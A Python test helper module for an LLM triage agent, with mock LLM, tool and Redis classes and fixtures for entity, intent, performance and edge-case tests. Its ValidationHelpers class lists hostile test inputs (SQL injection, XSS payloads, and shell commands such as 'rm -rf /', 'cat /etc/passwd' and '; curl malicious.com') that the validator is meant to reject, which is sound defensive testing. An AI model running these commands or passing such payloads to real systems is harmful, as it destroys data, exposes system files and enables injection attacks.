"""
Helper functions for triage sub agent tests to ensure functions are ≤8 lines
"""

import json
import asyncio
from datetime import datetime
from typing import Dict, Any, List
from unittest.mock import AsyncMock

from app.agents.triage_sub_agent import (
    ExtractedEntities,
    UserIntent,
    Priority,
    Complexity
)
from app.agents.state import DeepAgentState


class TriageMockHelpers:
    """Enhanced mock helpers for triage testing"""
    
    @staticmethod
    def create_mock_llm_manager():
        """Create enhanced mock LLM manager"""
        return MockLLMManager()
    
    @staticmethod
    def create_mock_tool_dispatcher():
        """Create mock tool dispatcher"""
        return MockToolDispatcher()
    
    @staticmethod
    def create_mock_redis(available=True):
        """Create mock Redis manager"""
        return MockRedisManager(available)


class MockLLMManager:
    """Enhanced mock LLM manager for comprehensive testing"""
    
    def __init__(self):
        self.ask_llm = AsyncMock()
        self.call_count = 0
        self.responses = []
        self.failures = []
    
    def set_responses(self, responses):
        """Set predefined responses"""
        self.responses = responses
        self.call_count = 0
        self.ask_llm.side_effect = self._create_side_effect()
    
    def _create_side_effect(self):
        """Create side effect function for mock"""
        def side_effect(*args, **kwargs):
            return self._get_next_response()
        return side_effect
    
    def _get_next_response(self):
        """Get next response from queue"""
        if self._should_fail():
            raise Exception(f"LLM error {self.call_count}")
        response = self._get_response_or_default()
        self.call_count += 1
        return response
    
    def _should_fail(self):
        """Check if current call should fail"""
        return (self.call_count < len(self.failures) 
                and self.failures[self.call_count])
    
    def _get_response_or_default(self):
        """Get response or default fallback"""
        if self.call_count < len(self.responses):
            return self.responses[self.call_count]
        return '{"category": "General Inquiry", "priority": "medium"}'
    
    def set_failure_pattern(self, failures):
        """Set failure pattern (True for failure, False for success)"""
        self.failures = failures


class MockToolDispatcher:
    """Mock tool dispatcher"""
    
    def __init__(self):
        self.available_tools = self._get_default_tools()
    
    def _get_default_tools(self):
        """Get default tool configuration"""
        return {
            "cost_analyzer": {"category": "optimization", "relevance": 0.9},
            "latency_analyzer": {"category": "performance", "relevance": 0.8},
            "performance_predictor": {"category": "performance", "relevance": 0.7},
            "corpus_manager": {"category": "data", "relevance": 0.6},
            "multi_objective_optimization": {"category": "optimization", "relevance": 0.85}
        }


class MockRedisManager:
    """Enhanced mock Redis manager"""
    
    def __init__(self, available=True):
        self.available = available
        self.cache = {}
        self.get_calls = []
        self.set_calls = []
    
    async def get(self, key):
        """Mock Redis get operation"""
        self.get_calls.append(key)
        self._check_availability()
        return self.cache.get(key)
    
    async def set(self, key, value, ex=None):
        """Mock Redis set operation"""
        self.set_calls.append((key, value, ex))
        self._check_availability()
        self.cache[key] = value
        return True
    
    def _check_availability(self):
        """Check if Redis is available"""
        if not self.available:
            raise Exception("Redis not available")


class ValidationHelpers:
    """Helpers for validation testing"""
    
    @staticmethod
    def get_sql_injection_patterns():
        """Get SQL injection test patterns"""
        return [
            "DROP TABLE users; SELECT * FROM secrets",
            "'; DELETE FROM logs; --",
            "UNION SELECT password FROM users",
            "admin'--",
            "1' OR '1'='1",
        ]
    
    @staticmethod
    def get_script_injection_patterns():
        """Get script injection test patterns"""
        return [
            "<script>alert('xss')</script>",
            "javascript:alert('test')",
            "<img src=x onerror=alert('xss')>",
            "eval(malicious_code)",
            "document.cookie",
        ]
    
    @staticmethod
    def get_command_injection_patterns():
        """Get command injection test patterns"""
        return [
            "rm -rf /",
            "cat /etc/passwd",
            "; curl malicious.com",
            "$(malicious command)",
            "`rm important_file`",
        ]
    
    @staticmethod
    def get_benign_requests():
        """Get benign test requests"""
        return [
            "How do I optimize my SQL SELECT queries for better performance?",
            "I need help with JavaScript async/await syntax",
            "Can you help me debug my React component's rendering?",
            "What's the best way to handle user authentication in my app?",
        ]


class EntityExtractionHelpers:
    """Helpers for entity extraction testing"""
    
    @staticmethod
    def create_complex_entities():
        """Create complex entities for testing"""
        return ExtractedEntities(
            models_mentioned=["gpt-4", "claude-2", "llama-2"],
            metrics_mentioned=["cost", "latency", "throughput", "accuracy"],
            thresholds=[
                {"type": "time", "value": 100, "unit": "ms"},
                {"type": "cost", "value": 1000, "unit": "USD"},
                {"type": "rate", "value": 500, "unit": "RPS"}
            ],
            targets=[
                {"type": "percentage", "value": 30, "description": "cost reduction"},
                {"type": "absolute", "value": 50, "unit": "ms", "description": "max latency"}
            ],
            time_ranges=[
                {"description": "last 7 days"},
                {"description": "peak hours"},
                {"description": "weekend"}
            ],
            # Note: additional_context removed as it's not in the model
        )
    
    @staticmethod
    def get_model_names_request():
        """Get request with complex model names"""
        return ("Compare GPT-4-turbo with Claude-3-opus and "
                "Llama-2-70B-chat for my use case involving "
                "gemini-pro and palm-2")
    
    @staticmethod
    def get_expected_models():
        """Get expected model names"""
        return {"gpt-4-turbo", "claude-3-opus", "llama-2-70b-chat", 
                "gemini-pro", "palm-2"}


class IntentHelpers:
    """Helpers for intent determination testing"""
    
    @staticmethod
    def create_comprehensive_intent():
        """Create comprehensive intent for testing"""
        return UserIntent(
            primary_intent="optimize",
            secondary_intents=["analyze", "monitor", "report"],
            action_required=True,
            confidence_score=0.92,
            intent_modifiers=["urgent", "cost-sensitive"],
            expected_outcome="30% cost reduction with maintained performance",
            timeline_mentioned="within 2 weeks"
        )
    
    @staticmethod
    def get_intent_test_cases():
        """Get intent determination test cases"""
        return [
            ("Debug my failing API calls", "debug"),
            ("Scale my infrastructure for Black Friday", "scale"),
            ("Monitor my application performance", "monitor"),
            ("Migrate from GPT-3.5 to GPT-4", "migrate"),
            ("Validate my optimization results", "validate"),
        ]


class AsyncTestHelpers:
    """Helpers for async testing"""
    
    @staticmethod
    async def create_timeout_llm(*args, **kwargs):
        """Create LLM that times out"""
        await asyncio.sleep(0.1)
        raise asyncio.TimeoutError("LLM request timed out")
    
    @staticmethod
    def create_rate_limit_error(*args, **kwargs):
        """Create rate limit error"""
        raise Exception("Rate limit exceeded. Please try again later.")
    
    @staticmethod
    async def run_concurrent_states(agent, count=3):
        """Run concurrent triage executions"""
        states = [
            DeepAgentState(user_request=f"Request {i}", user_id=f"user_{i}")
            for i in range(count)
        ]
        
        tasks = [
            agent.execute(state, f"concurrent_{i}", stream_updates=False)
            for i, state in enumerate(states)
        ]
        
        await asyncio.gather(*tasks)
        return states


class AssertionHelpers:
    """Helpers for common assertions"""
    
    @staticmethod
    def assert_malicious_pattern_detected(validation):
        """Assert malicious pattern was detected"""
        assert validation.is_valid == False
        assert any("malicious" in error.lower() or "security" in error.lower() 
                  for error in validation.validation_errors)
    
    @staticmethod
    def assert_valid_triage_result(result):
        """Assert valid triage result structure"""
        assert result is not None
        assert "category" in result
        assert "priority" in result
        assert "metadata" in result
    
    @staticmethod
    def assert_cache_hit_performance(state, execution_time_ms):
        """Assert cache hit performance"""
        assert execution_time_ms < 100
        if isinstance(state.triage_result, dict):
            assert state.triage_result.get("metadata", {}).get("cache_hit") == True
    
    @staticmethod
    def assert_fallback_used(result):
        """Assert fallback was used"""
        if isinstance(result, dict):
            assert result.get("metadata", {}).get("fallback_used") == True
    
    @staticmethod
    def assert_tools_ranked_by_relevance(tools):
        """Assert tools are ranked by relevance"""
        for i in range(len(tools) - 1):
            assert tools[i].relevance_score >= tools[i + 1].relevance_score


class PerformanceHelpers:
    """Helpers for performance testing"""
    
    @staticmethod
    def create_large_request(multiplier=1000):
        """Create large request for memory testing"""
        return "Analyze and optimize " * multiplier
    
    @staticmethod
    def get_request_sizes():
        """Get request sizes for performance testing"""
        return [10, 100, 1000, 5000]
    
    @staticmethod
    def create_sized_request(size):
        """Create request of approximate size"""
        return "Optimize my costs. " * (size // 20)
    
    @staticmethod
    def measure_execution_time(start_time, end_time):
        """Measure execution time in milliseconds"""
        return (end_time - start_time).total_seconds() * 1000


class EdgeCaseHelpers:
    """Helpers for edge case testing"""
    
    @staticmethod
    def get_empty_requests():
        """Get empty/whitespace requests"""
        return [
            "",  # Empty string
            "   ",  # Only whitespace
            "\n\t\r",  # Only whitespace characters
            ".",  # Single character
            "??",  # Only punctuation
        ]
    
    @staticmethod
    def get_unicode_requests():
        """Get Unicode test requests"""
        return [
            "Optimize costs for my café's AI system",
            "Analyse les coûts d'IA pour mon système",
            "优化我的AI成本",
            "Оптимизируйте стоимость ИИ",
            "🚀 Optimize my AI costs! 💰📊",
            "Cost optimization → better performance",
        ]
    
    @staticmethod
    def get_malformed_json_responses():
        """Get malformed JSON responses"""
        return [
            '{"category": "Test"',  # Unclosed JSON
            '{"category": "Test", "priority": }',  # Missing value
            '{"category": "Test", "priority": "high",}',  # Trailing comma
            'category: "Test", priority: "high"',  # Missing braces
            'null',  # Null response
            '',  # Empty response
        ]